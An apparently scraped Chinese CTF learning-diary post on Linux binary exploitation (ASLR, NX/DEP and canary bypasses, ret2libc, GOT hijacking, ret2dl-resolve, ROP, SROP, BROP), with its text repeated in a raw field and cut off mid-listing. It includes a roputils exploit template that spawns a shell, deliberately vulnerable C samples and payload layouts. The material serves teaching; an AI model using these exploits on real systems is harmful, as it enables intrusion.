调整堆栈，执行function\n\n可通过伪造两个相关的数据结构：\n\n```c\ntypedef struct\n{\n  Elf32_Addr    r_offset;       /* Address */\n  Elf32_Word    r_info;         /* Relocation type and symbol index */\n} Elf32_Rel;\ntypedef struct\n{\n  Elf32_Word    st_name;        /* Symbol name (string tbl index) */\n  Elf32_Addr    st_value;       /* Symbol value */\n  Elf32_Word    st_size;        /* Symbol size */\n  unsigned char st_info;        /* Symbol type and binding */\n  unsigned char st_other;       /* Symbol visibility */\n  Elf32_Section st_shndx;       /* Section index */\n} Elf32_Sym;\n```\n\n控制reloc_offset的数值，使const char *symname指向伪造的数据结构中的函数名。最后在function@got即&GOT+reloc_offset中填入我们伪造的symname（如system）函数的真实地址。\n\n**ret2dl-resolve自动利用工具roputils**\n\n```python\n#现成32位模板：\nfrom roputils import *\nfpath = sys.argv[1]\noffset = int(sys.argv[2])\nrop = ROP(fpath)\naddr_bss = rop.section('.bss')\nbuf = rop.retfill(offset)\nbuf += rop.call('read', 0, addr_bss, 100)\nbuf += rop.dl_resolve_call(addr_bss+20, addr_bss)\np = Proc(rop.fpath)\np.write(p32(len(buf)) + buf)\nprint \"[+] read: %r\" % p.read(len(buf))\nbuf = rop.string('/bin/sh')\nbuf += rop.fill(20, buf)\nbuf += rop.dl_resolve_data(addr_bss+20, 'system')\nbuf += rop.fill(100, buf)\np.write(buf)\np.interact(0)\n```\n\n**ASLR Bypass之GOT劫持**\n\n当不能直接利用roputils时需要手动伪造两个数据结构、计算偏移和填充大小。\n\n**ASLR Bypass之ret2eax**\n\n```c\nvoid msglog(char *input) {\n    char buf[64];\n    strcpy(buf, input);      //<---------返回值是一个存储在eax的指向buf的指针\n}\nint main(int argc, char *argv[]) {\n    if(argc != 2) {\n        printf(\"exploitme <msg>\\n\");\n        return -1;\n    }\nmsglog(argv[1]);\nreturn 0;\n}\n```\n\n随后，调用*eax就会把程序控制流劫持到buf上\n\n**ASLR Bypass之ret2ret**\n\n如果栈上有一个函数指针需要被执行，可以考虑这个ret = pop eip；jmp eip；\n\n```c\nvoid f(char *str) {\n   char buffer[256];\n   strcpy(buffer, str);\n}\nint main(int argc, char *argv[]) {\n   int no = 1;\n   int *ptr = &no;\n   f(argv[1]);\n}\n```\n\n**ASLR Bypass之ret2pop**\n\n返回到一个地址，执行的命令为pop xxx,ret，在栈上布置要返回的函数和参数。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626171343899.png\" alt=\"image-20210626171343899\" style=\"zoom:50%;\" />\n\n### **NX/DEP**\n\nNX/DEP保护，即数据段不可执行保护，是针对栈溢出攻击而产生的一项防护措施。简单的来说，当开启这种保护时，堆栈上的指令将没有执行权限。所以，将shellcode写到栈上的简单的栈溢出攻击将会失效。\n\n **DEP绕过之ret2libc**\n\n不利用自己注入的代码，而用系统已有的代码来构造攻击\n\nsystem(\"/bin/sh\")\n\n- 特点\n\n- - 通常指向系统共享库的代码 —>执行不受NX/DEP影响\n\n- 溢出形式\n            buffer + system()的地址 + ret + binsh_addr\n            system()的地址即系统共享库中system()的地址。\n            这里ret的值是执行玩system()后的返回地址，并不重要，可以为任意值。p64(0)\n            binsh_addr()作为system()的参数，调用后拉起shell。\n\n**如果有ASLR保护？**\n\n地址空间配置随机载入（英语：Address space layout randomization，缩写ASLR，又称位址空间配置随机化、位址空间布局随机化）是一种防范内存损坏漏洞被利用的计算机安全技术。位址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。（维基百科）\n\n即使开启地址随机化，也不是全随机的。对于linux来说，开启ASLR，libc的基地址在每一次启动时都会变化，但是libc本身是整块存入内存的。即libc中指令相对于其基地址的偏移是不会变化的。而libc本身的指令是足够getshell的，所以要对抗ASLR，可以从泄露libc基地址下手。\n\n**影响**\n\n- libc基地址变动\n- gadgets的地址难以确认。\n            ldd 查看libc地址，发现每一次都有变动。\n\n```shell\n~/Documents/pwnkr/bof $ ldd bof\n\tlinux-gate.so.1 =>  (0xf7777000)\n\tlibc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7599000)\n\t/lib/ld-linux.so.2 (0x5662b000)\n~/Documents/pwnkr/bof $ ldd bof\n\tlinux-gate.so.1 =>  (0xf7720000)\n\tlibc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7542000)\n~/Documents/pwnkr/bof $ ldd bof\n\tlinux-gate.so.1 =>  (0xf775d000)\n\tlibc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf757f000)\n\t/lib/ld-linux.so.2 (0x565c1000)\n```\n\n**ASLR应对方法**\n\n- 泄露libc地址\n\n- for example \n\n- - 用write(1,got.write(),4)打印write()函数的实际地址，通过偏移来算libc.so的基地址，进而算出system()的真实地址。\n  - libc_addr=write_addr - write_offset\n  - system_addr=libc_addr + system_offset\n\n**Memory Leak & DynELF**\n\nDynELF是pwntools提供的一个模块，可以帮助我们在没有libc文件时找到system()的地址。\n\n- 使用\n            DynELF(leak,elf=ELF('')).lookup('system','libc')\n            leak，需要自己实现的函数，在此函数中至少要泄漏一个字节的内存。\n- leak()的形式\n\ndef leak(address):\n  ...\n\n return data\n\n还有\"/bin/sh\"\n需要注意的是，DynElF无法搜索到\"/bin/sh\"的地址，这里可以用一个read()把\"/bin/sh\"写到bss段上\n\n**DEP绕过之ROP**\n\n面向返回编程（Return-Oriented Programming，ROP）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。\n\n**关于gadget**\n\n攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列称为gadget。\n\n每一段gadget通常是结束于return指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。\n\n**32位栈溢出和64位的区别**\n\n- 内存地址范围从32位增加到64位\n\n- 函数参数的传递由压栈传参变成了先由寄存器传参，依次是RDI，RSI，RDX，RCX，R8和     R9，不够用时才会通过栈来传递\n\n- 内存地址不大于0x00007fffffffffff，否则抛出异常。\n\n- 64位下re2libc \n\n- - buffer + pop_rdi_ret + binsh_addr + system()\n  - 或者buffer + pop_rax_pop_rdi_call_rax + system() + binsh_addr\n\n- 主要的gadget \n\n- - 传参（pop xxx,ret）\n  - 系统调用函数（system()，exec()）\n\n**ROPgadeget**\n\n$ ROPgadget --binary --only \"pop|ret\"\n\n~/Documents/pwnkr/bof $ ROPgadget --binary bof --only \"pop|ret\"\n\n```assembly\nGadgets information\n============================================================\n0x000005ee : pop ebp ; ret\n0x00000624 : pop ebx ; pop ebp ; ret\n0x000005ec : pop ebx ; pop esi ; pop ebp ; ret\n0x0000070c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x000004a0 : pop ebx ; ret\n0x0000070e : pop edi ; pop ebp ; ret\n0x000005ed : pop esi ; pop ebp ; ret\n0x0000070d : pop esi ; pop edi ; pop ebp ; ret\n0x0000047f : ret\nUnique gadgets found: 9\n```\n\n程序比较小时，gadget的数量也不多，也可以考虑搜索libc.so中的gadget，可用的很多。\n\n**Libc上的Gadget**\n\n能够泄漏libc基地址时，使用libc的gadget更加方便和容易，libc上可用的gadget就很丰富了。\n\n$ ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 --only \"pop|ret\"\n ...\n Unique gadgets found: 1226\n\n**ret2__libc_csu_init**\n\nlibc_csu_init()用于对libc进行初始化操作的函数，只要使用了libc函数就一定会有此函数出现，而绝大多数的程序都会调用libc的函数，即__libc_csu_init()广泛存在于linux程序中。\n\n__libc_csu_init()中的gadget也可以作为通用gadget。\n\n```assembly\n.text:00000000004005C0 ; void _libc_csu_init(void)\n.text:00000000004005C0                 public __libc_csu_init\n.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16\u0018o\n.text:00000000004005C0                 push    r15\n.text:00000000004005C2                 push    r14\n.text:00000000004005C4                 mov     r15d, edi\n.text:00000000004005C7                 push    r13\n.text:00000000004005C9                 push    r12\n.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry\n.text:00000000004005D2                 push    rbp\n.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry\n.text:00000000004005DA                 push    rbx\n.text:00000000004005DB                 mov     r14, rsi\n.text:00000000004005DE                 mov     r13, rdx\n.text:00000000004005E1                 sub     rbp, r12\n.text:00000000004005E4                 sub     rsp, 8\n.text:00000000004005E8                 sar     rbp, 3\n.text:00000000004005EC                 call    _init_proc\n.text:00000000004005F1                 test    rbp, rbp\n.text:00000000004005F4                 jz      short loc_400616\n.text:00000000004005F6                 xor     ebx, ebx\n.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]\n.text:0000000000400600\n.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54\u0019j\n.text:0000000000400600                 mov     rdx, r13\n.text:0000000000400603                 mov     rsi, r14\n.text:0000000000400606                 mov     edi, r15d\n.text:0000000000400609                 call    qword ptr [r12+rbx*8]\n.text:000000000040060D                 add     rbx, 1\n.text:0000000000400611                 cmp     rbx, rbp\n.text:0000000000400614                 jnz     short loc_400600\n.text:0000000000400616\n.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34\u0018j\n.text:0000000000400616                 add     rsp, 8\n.text:000000000040061A                 pop     rbx\n.text:000000000040061B                 pop     rbp\n.text:000000000040061C                 pop     r12\n.text:000000000040061E                 pop     r13\n.text:0000000000400620                 pop     r14\n.text:0000000000400622                 pop     r15\n.text:0000000000400624                 retn\n.text:0000000000400624 __libc_csu_init endp\n```\n\n- 最后连续的6个pop，可以用栈溢出控制rbx，rbp，r12，r13，r14，r15\n- 之后从400600开始可以控制到rdi（通过edi），rsi，rdx的值，并call[r12+rbx*8]。\n  通过上面的调用可以控制到三个传递参数的寄存器，并且执行一次call，完成ret2libc。\n\n**JOP**\n\n$ ROPgadget --binary BIN --only \"pop|jmp\"\n\n以jmp结束的一系列指令，原理与普通ROP类似。\n\n**SROP**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173337625.png\" alt=\"image-20210626173337625\" style=\"zoom:50%;\" />\n\nsignal机制是一套被广泛应用于unix的机制，它通常用于系统在用户态和内核态切换，执行如杀死进程，设置进程定时器等功能。\n\n如图所示，内核向进程发起signal。进程挂起，进入内核（1），内核为进程保存上下文，跳到signal handler，之后又返回内核态，上下文恢复，最后返回最初的进程。\n\n重点在第二步和第三步上，我们可以把signal handler理解为一个特殊的函数，这个函数返回地址是rt_sigreturn，在执行完signal handler，会返回到rt_sigretrun，而rt_sigreturn会将上下文参数恢复。下图是linux系统保存在栈上的上下文信息。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173459882.png\" alt=\"image-20210626173459882\" style=\"zoom:70%;\" />\n\n可以看到，寄存器的值作为上下文信息的一部分被保存在了栈上，而在rt_sigreturn 执行时又会把寄存器的值从栈上复制到寄存器中，从而恢复用户进程挂起之前的状态。其中，内核为用户恢复上下文时不会对栈上的上下文信息进行检查。意即，我们完全可以通过栈溢出伪造一个存储上下文信息的栈，通过rt_sigreturn将栈上的数据放到寄存器中。如下图\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173550488.png\" alt=\"image-20210626173550488\" style=\"zoom:67%;\" />\n\n**system call chains**\n\n那么此时当rt_sigreturn 执行完毕后，随后就会执行rip指向的syscall()，并且以rax和rdi为参数。明显的，这个函数调用会弹出一个shell，攻击完成。\n\n如果栈上存放的rip指向的地址不仅仅是syscall()而是syscall(),ret的gadget，并且控制栈指针指向另一个Fake Signal Frame，可以生成一系列的signal调用。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174128518.png\" alt=\"image-20210626174128518\" style=\"zoom:50%;\" />\n\n可以看到，寄存器的值作为上下文信息的一部分被保存在了栈上，而在rt_sigreturn 执行时又会把寄存器的值从栈上复制到寄存器中，从而恢复用户进程挂起之前的状态。其中，内核为用户恢复上下文时不会对栈上的上下文信息进行检查。意即，我们完全可以通过栈溢出伪造一个存储上下文信息的栈，通过rt_sigreturn将栈上的数据放到寄存器中。如下图\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174307723.png\" alt=\"image-20210626174307723\" style=\"zoom:50%;\" />\n\n**BROP (blind rop)**\n\nBROP与其说是rop技巧，更不如说是寻找gadget的技巧，它的特长在于，可以在没有源程序的情况下寻找有效的gadget，是一种适用于远程攻击的rop，针对的是64位系统。\n\n- 攻击条件\n  在前面我们提到了aslr保护，也就是地址随机化保护，在远程服务器中，服务器端的程序进程崩溃之后会自动重新启动。而对于大部分服务器应用来说，崩溃后重启的地址与崩溃前一样，也就是说虽然服务器端开启了额aslr保护，但只会在第一次启动时生效，崩溃后的重启并不会再次启用aslr随机化。当我们遇到这种远程程序的时候，可以反复进行崩溃尝试而不必担心aslr的影响。\n\n**stack reading**\n\n用于绕过canary保护\n\ncanary（金丝雀）\n\n过去由于缺少气体环境的检测工具，煤矿工人会带着金丝雀下矿洞，金丝雀对于周围气体非常敏感，如果金丝雀死亡，则说明有大量的危险气体，这时矿工就会撤离。\n\n在现代操作系统中，canary是一种防止栈溢出的保护机制，在开辟函数栈时，会先在fs块内存中的某个地方读取值并存到栈上，当函数运行到返回之前，会先检查当前栈上的数据与一开始从fs块上读取的值是否相同（通常是一个异或比较），若不同，则认为程序被栈溢出攻击，直接崩溃。狭义的来说，栈上一开始保存的数据，被我们称为canary。需要注意的是，canary的最低一位一般为“/x00”，这是为了防止canary被一些可以打印栈上数据的漏洞泄露。\n\n- 必要条件,崩溃后的重启不会改变canary的值。\n- 开启canary保护时栈上的布局,Buffer|canary|pre ebp|ret\n\n**覆盖canary**\n\n32位系统下canary长度一般为4个字节，64位下则是8个字节。\n\n进行爆破尝试时，如果仅仅是枚举所有可能的数值，则最多需要尝试4294967296（FFFF+1）次，无疑时非常低效的。\n\n- 改进\n  为了提升效率，我们可以采用逐字节爆破的方式，具体见图。对于逐字节爆破，最大尝试次数仅为4*256=1024\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174745466.png\" alt=\"image-20210626174745466\" style=\"zoom:80%;\" />\n\n**blind**\n\n这里的blind是指没有本地二进制文件或者源码的情况，即只有位于远程服务器端程序。\n\n不同于本地二进制文件或源码，我们可以直接扫描本地内存获取gadget，远程服务器端的程序，我们很难找到有效的gadget。此时我们可以换个思路，先远程dump内存，利用write（）或者puts（）这类的输出函数来实现。\n\n**寻找起write()和puts()参数的gadgets**\n\n这类gadgets一般形式是pop xxx,ret\n\n- trap地址\n            当程序执行到这个地址时，程序会崩溃。这种地址很常见，内存中到处都是这类地址，一个随机跳转的地址总是能引起程序崩溃。\n- stop地址\n            区别于trap地址，当程序执行到这个地址时，程序会被挂起或者无限循环。\n\n**brop gadget**\n\n在libc_csu_init的结尾一段这样的指令\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626175012882.png\" alt=\"image-20210626175012882\" style=\"zoom:80%;\" />\n\n可以看到，这段指令的特殊之处在于它是连续6个pop接一个ret。这种结构非常少见，意即我们可以通过寻找这种结构的gadget来找到这段指令。由上图可以看到的是，这段brop gadget虽然只是对rbx，rbx，r12，r13，r14，r15进行pop然后ret，但是通过分析其机器码，若程序从偏移0x7开始执行，指令则变为pop rsi，pop r15，ret。若程序从偏移0x9开始执行，指令则变为pop rdi，ret。所以若找到这段brop gadget，我们便可以通过偏移找到起第一个和第二个函数参数的gadget。\n\n**寻找brop gadget的地址**\n\n下面讲如何用trap地址和stop地址试探brop gadget的地址。我们把payload进行如下构造buffer+canary+rbp+ret+trap\\*6+stop+trap*n。其中，buffer和rbp的值随意填，ret的值从0x400000开始枚举，一般情况下，由于我们是枚举地址，程序会崩溃。当程序并没有崩溃而是挂起，即无限循环时，记下此时的ret的值。枚举结束后，得到若干ret的值，这里需要注意，得到的ret值有可能不是brop gadget的地址而刚好是另一个stop地址。\n\n如果是stop地址，把ret后所有地址都设为trap地址，若仍然会导致程序挂起，则确认是stop地址。\n\n**第三个参数的gadget**\n\n- 对于puts()，此时的gadgets其实已经足够，但是对于write(),仍然需要一个起参数的gadget。\n- pop rdx,ret难以寻找，用strcmp()代替。 \n  strcmp()可以对rdx进行赋值。\n- 最后用puts()或者write()dump内存，寻找更多的gadgets来完成攻击。\n\n \n","source":"_posts/ctfpwn3.md","raw":"```\n学习日记3\n```\n\n**ASLR**\n\n地址空间配置随机载入（Address Space Layout Randomization，ASLR，又称地址空间配置随机化、地址空间布局随机化）是一种防范内存损坏漏洞被利用的计算机安全技术。\n\n地址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。\n\n传统攻击：\n\n- 基础栈溢出：需要定位shellcode\n- return-to-libc：     需要libc地址\n\n开启ASLR后：libc基址不再固定，shellcode的地址（栈、bss等地址）在每一次运行时也相应地发生改变，传统的地址硬编码的攻击基本失效。\n\n| **Aspect** | **aslr**                       |\n| ---------- | ------------------------------ |\n| 表现       | 优异-每次加载都会随机          |\n| 发布       | 获得内核支持，不需要重新编译   |\n| 兼容性     | 对安全应用程序透明（位置独立） |\n| 保护效果   | 64位下效果显著                 |\n\n查看当前ASLR状态：\n\n```shell\n$ cat /proc/sys/kernel/randomize_va_space\n```\n\n 2\n\n该值为：\n\n- 1: 随机化堆栈，VDSO，共享内存区域的位置\n- 2: 同上，并添加数据段的随机\n- 0: 禁用ASLR\n\nlinux关闭ASLR:\n\n```shell\n# echo 0 >> /proc/sys/kernel/randomize_va_space\n```\n\n**ASLR Bypass**\n\n- leak address\n- 暴力破解\n- 非随机化内存\n- ret2text\n- 函数指针\n- GOT表劫持（不依赖libc空间）\n- rewrite GOT[]\n- ret2dl-resolve\n\n- 栈juggling\n- ret2ret\n- ret2pop\n- ret2eax\n\n**ASLR Bypass之leak address**\n\n开启ASLR后无法通过控制eip来直接输出地址。\n\n但是可以通过覆盖相关数据来间接地泄露地址。\n\n如：\n\n- 输出内容中是否有地址信息\n- 如：精心设计的输出、未初始化的变量等\n- 覆盖输出函数的指针\n- 如：覆盖printf()的参数\n- 覆盖输出的缓冲区大小\n- 如：覆盖write(),memcpy()的参数\n\n**ASLR Bypass之暴力绕过**\n\n- 使用大量NOP填充shellcode，提高地址命中率，并暴力搜索栈的地址\n            payload： nop*n + shellcode\n\n### **ASLR Bypass之非随机化内存**\n\nret2text\n\ntext段有可以执行的程序代码，并且地址不会被除PIE之外的ASLR随机化,可以将程序执行流劫持到意外的（但已经存在）的程序函数\n\n**函数指针劫持**\n\n覆盖一个函数指针指向：\n\n- 程序函数\n- 程序连接表中的其他库函数\n\n```c\nint secret(char *input){... }\nint chk_pwd(char *input){... }\nint main()\n{\nint (*ptr)(char *input);\nchar buf[8];\nptr = &chk_pwd;\nstrncpy(buf,argv[1],12);\nprintf(\"hello %s!\\n\",buf);\n(*ptr)(argv[2]);\n}\n```\n\n**ASLR Bypass之GOT劫持**\n\n- 第一次运行函数\n  函数先跳转到plt表，从plt表跳转到got表，got表中存储的是该函数在plt表中的地址+4偏移，于是又跳转到plt下，执行push     xx，jmp <got [0]>，其中push是给检索函数提供参数，jmp到got表的检索函数，此时got表中就会填充函数的准确地址\n\n```c\n#include <stdio.h>\nint main()\n{\nprintf(\"hello world\\n\");\nreturn 0;\n}\n```\n\n```assembly\npwndbg> disass main\nDump of assembler code for function main:\n0x0000000000400526 <+0>:\tpush   rbp\n0x0000000000400527 <+1>:\tmov    rbp,rsp\n0x000000000040052a <+4>:\tmov    edi,0x4005c4\n0x000000000040052f <+9>:\tcall   0x400400 <puts@plt>\n0x0000000000400534 <+14>:\tmov    eax,0x0\n0x0000000000400539 <+19>:\tpop    rbp\n0x000000000040053a <+20>:\tret\nEnd of assembler dump.\npwndbg> disass *0x400400\nNo function contains specified address.\npwndbg> disass 0x400400\nDump of assembler code for function puts@plt:\n0x0000000000400400 <+0>:\tjmp    QWORD PTR [rip+0x200c12]        # 0x601018\n0x0000000000400406 <+6>:\tpush   0x0\n0x000000000040040b <+11>:\tjmp    0x4003f0\nEnd of assembler dump.\npwndbg> x 0x601018\n0x601018:\t0x00400406\n```\n\n**改写GOT表项**\n\n- GOT中存储的是函数在内存中的真实地址\n- 利用方法\n- 覆盖got表中的地址，当程序运行某一个函数，实际执行的是另一个我们覆盖的函数。\n- e.g.:覆盖printf()为system()\n\n**ret2dl-resolve（32位为例）**\n\nelf.h:\n\n\\#define reloc_offset reloc_arg\n\n- 计算重定位条目基址 Elf32_Rel  * reloc = JMPREL + reloc_offset;\n- 计算符号表条目基址 Elf32_Sym  * sym = &SYMTAB[ ELF32_R_SYM (reloc->r_info) ];\n- 获得符号名称 const char  *symname = strtab + sym->st_name;\n- 通过符号名称symname搜索动态库，将地址填入function@got（即&GOT+reloc_offset）\n- 调整堆栈，执行function\n\n可通过伪造两个相关的数据结构：\n\n```c\ntypedef struct\n{\n  Elf32_Addr    r_offset;       /* Address */\n  Elf32_Word    r_info;         /* Relocation type and symbol index */\n} Elf32_Rel;\ntypedef struct\n{\n  Elf32_Word    st_name;        /* Symbol name (string tbl index) */\n  Elf32_Addr    st_value;       /* Symbol value */\n  Elf32_Word    st_size;        /* Symbol size */\n  unsigned char st_info;        /* Symbol type and binding */\n  unsigned char st_other;       /* Symbol visibility */\n  Elf32_Section st_shndx;       /* Section index */\n} Elf32_Sym;\n```\n\n控制reloc_offset的数值，使const char *symname指向伪造的数据结构中的函数名。最后在function@got即&GOT+reloc_offset中填入我们伪造的symname（如system）函数的真实地址。\n\n**ret2dl-resolve自动利用工具roputils**\n\n```python\n#现成32位模板：\nfrom roputils import *\nfpath = sys.argv[1]\noffset = int(sys.argv[2])\nrop = ROP(fpath)\naddr_bss = rop.section('.bss')\nbuf = rop.retfill(offset)\nbuf += rop.call('read', 0, addr_bss, 100)\nbuf += rop.dl_resolve_call(addr_bss+20, addr_bss)\np = Proc(rop.fpath)\np.write(p32(len(buf)) + buf)\nprint \"[+] read: %r\" % p.read(len(buf))\nbuf = rop.string('/bin/sh')\nbuf += rop.fill(20, buf)\nbuf += rop.dl_resolve_data(addr_bss+20, 'system')\nbuf += rop.fill(100, buf)\np.write(buf)\np.interact(0)\n```\n\n**ASLR Bypass之GOT劫持**\n\n当不能直接利用roputils时需要手动伪造两个数据结构、计算偏移和填充大小。\n\n**ASLR Bypass之ret2eax**\n\n```c\nvoid msglog(char *input) {\n    char buf[64];\n    strcpy(buf, input);      //<---------返回值是一个存储在eax的指向buf的指针\n}\nint main(int argc, char *argv[]) {\n    if(argc != 2) {\n        printf(\"exploitme <msg>\\n\");\n        return -1;\n    }\nmsglog(argv[1]);\nreturn 0;\n}\n```\n\n随后，调用*eax就会把程序控制流劫持到buf上\n\n**ASLR Bypass之ret2ret**\n\n如果栈上有一个函数指针需要被执行，可以考虑这个ret = pop eip；jmp eip；\n\n```c\nvoid f(char *str) {\n   char buffer[256];\n   strcpy(buffer, str);\n}\nint main(int argc, char *argv[]) {\n   int no = 1;\n   int *ptr = &no;\n   f(argv[1]);\n}\n```\n\n**ASLR Bypass之ret2pop**\n\n返回到一个地址，执行的命令为pop xxx,ret，在栈上布置要返回的函数和参数。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626171343899.png\" alt=\"image-20210626171343899\" style=\"zoom:50%;\" />\n\n### **NX/DEP**\n\nNX/DEP保护，即数据段不可执行保护，是针对栈溢出攻击而产生的一项防护措施。简单的来说，当开启这种保护时，堆栈上的指令将没有执行权限。所以，将shellcode写到栈上的简单的栈溢出攻击将会失效。\n\n **DEP绕过之ret2libc**\n\n不利用自己注入的代码，而用系统已有的代码来构造攻击\n\nsystem(\"/bin/sh\")\n\n- 特点\n\n- - 通常指向系统共享库的代码 —>执行不受NX/DEP影响\n\n- 溢出形式\n            buffer + system()的地址 + ret + binsh_addr\n            system()的地址即系统共享库中system()的地址。\n            这里ret的值是执行玩system()后的返回地址，并不重要，可以为任意值。p64(0)\n            binsh_addr()作为system()的参数，调用后拉起shell。\n\n**如果有ASLR保护？**\n\n地址空间配置随机载入（英语：Address space layout randomization，缩写ASLR，又称位址空间配置随机化、位址空间布局随机化）是一种防范内存损坏漏洞被利用的计算机安全技术。位址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。（维基百科）\n\n即使开启地址随机化，也不是全随机的。对于linux来说，开启ASLR，libc的基地址在每一次启动时都会变化，但是libc本身是整块存入内存的。即libc中指令相对于其基地址的偏移是不会变化的。而libc本身的指令是足够getshell的，所以要对抗ASLR，可以从泄露libc基地址下手。\n\n**影响**\n\n- libc基地址变动\n- gadgets的地址难以确认。\n            ldd 查看libc地址，发现每一次都有变动。\n\n```shell\n~/Documents/pwnkr/bof $ ldd bof\n\tlinux-gate.so.1 =>  (0xf7777000)\n\tlibc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7599000)\n\t/lib/ld-linux.so.2 (0x5662b000)\n~/Documents/pwnkr/bof $ ldd bof\n\tlinux-gate.so.1 =>  (0xf7720000)\n\tlibc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7542000)\n~/Documents/pwnkr/bof $ ldd bof\n\tlinux-gate.so.1 =>  (0xf775d000)\n\tlibc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf757f000)\n\t/lib/ld-linux.so.2 (0x565c1000)\n```\n\n**ASLR应对方法**\n\n- 泄露libc地址\n\n- for example \n\n- - 用write(1,got.write(),4)打印write()函数的实际地址，通过偏移来算libc.so的基地址，进而算出system()的真实地址。\n  - libc_addr=write_addr - write_offset\n  - system_addr=libc_addr + system_offset\n\n**Memory Leak & DynELF**\n\nDynELF是pwntools提供的一个模块，可以帮助我们在没有libc文件时找到system()的地址。\n\n- 使用\n            DynELF(leak,elf=ELF('')).lookup('system','libc')\n            leak，需要自己实现的函数，在此函数中至少要泄漏一个字节的内存。\n- leak()的形式\n\ndef leak(address):\n  ...\n\n return data\n\n还有\"/bin/sh\"\n需要注意的是，DynElF无法搜索到\"/bin/sh\"的地址，这里可以用一个read()把\"/bin/sh\"写到bss段上\n\n**DEP绕过之ROP**\n\n面向返回编程（Return-Oriented Programming，ROP）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。\n\n**关于gadget**\n\n攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列称为gadget。\n\n每一段gadget通常是结束于return指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。\n\n**32位栈溢出和64位的区别**\n\n- 内存地址范围从32位增加到64位\n\n- 函数参数的传递由压栈传参变成了先由寄存器传参，依次是RDI，RSI，RDX，RCX，R8和     R9，不够用时才会通过栈来传递\n\n- 内存地址不大于0x00007fffffffffff，否则抛出异常。\n\n- 64位下re2libc \n\n- - buffer + pop_rdi_ret + binsh_addr + system()\n  - 或者buffer + pop_rax_pop_rdi_call_rax + system() + binsh_addr\n\n- 主要的gadget \n\n- - 传参（pop xxx,ret）\n  - 系统调用函数（system()，exec()）\n\n**ROPgadeget**\n\n$ ROPgadget --binary --only \"pop|ret\"\n\n~/Documents/pwnkr/bof $ ROPgadget --binary bof --only \"pop|ret\"\n\n```assembly\nGadgets information\n============================================================\n0x000005ee : pop ebp ; ret\n0x00000624 : pop ebx ; pop ebp ; ret\n0x000005ec : pop ebx ; pop esi ; pop ebp ; ret\n0x0000070c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x000004a0 : pop ebx ; ret\n0x0000070e : pop edi ; pop ebp ; ret\n0x000005ed : pop esi ; pop ebp ; ret\n0x0000070d : pop esi ; pop edi ; pop ebp ; ret\n0x0000047f : ret\nUnique gadgets found: 9\n```\n\n程序比较小时，gadget的数量也不多，也可以考虑搜索libc.so中的gadget，可用的很多。\n\n**Libc上的Gadget**\n\n能够泄漏libc基地址时，使用libc的gadget更加方便和容易，libc上可用的gadget就很丰富了。\n\n$ ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 --only \"pop|ret\"\n ...\n Unique gadgets found: 1226\n\n**ret2__libc_csu_init**\n\nlibc_csu_init()用于对libc进行初始化操作的函数，只要使用了libc函数就一定会有此函数出现，而绝大多数的程序都会调用libc的函数，即__libc_csu_init()广泛存在于linux程序中。\n\n__libc_csu_init()中的gadget也可以作为通用gadget。\n\n```assembly\n.text:00000000004005C0 ; void _libc_csu_init(void)\n.text:00000000004005C0                 public __libc_csu_init\n.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16\u0018o\n.text:00000000004005C0                 push    r15\n.text:00000000004005C2                 push    r14\n.text:00000000004005C4                 mov     r15d, edi\n.text:00000000004005C7                 push    r13\n.text:00000000004005C9                 push    r12\n.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry\n.text:00000000004005D2                 push    rbp\n.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry\n.text:00000000004005DA                 push    rbx\n.text:00000000004005DB                 mov     r14, rsi\n.text:00000000004005DE                 mov     r13, rdx\n.text:00000000004005E1                 sub     rbp, r12\n.text:00000000004005E4                 sub     rsp, 8\n.text:00000000004005E8                 sar     rbp, 3\n.text:00000000004005EC                 call    _init_proc\n.text:00000000004005F1                 test    rbp, rbp\n.text:00000000004005F4                 jz      short 